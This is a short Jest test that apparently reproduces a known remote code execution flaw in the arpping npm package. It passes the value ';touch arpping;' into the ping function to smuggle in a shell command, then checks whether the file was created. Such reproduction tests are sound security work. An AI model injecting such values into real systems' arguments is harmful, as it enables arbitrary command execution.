//https://security.snyk.io/vuln/SNYK-JS-ARPPING-1060047
test("Remote code execution in arpping", () => {
  expect.assertions(2);
  const Arpping = require("arpping");
  const fs = require("fs");
  const path = "./arpping";
  const sleep = require("sleep");
  let arpping = new Arpping();
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return arpping
    .ping([";touch arpping;"])
    .then(() => {})
    .catch((err) => console.log(err))
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
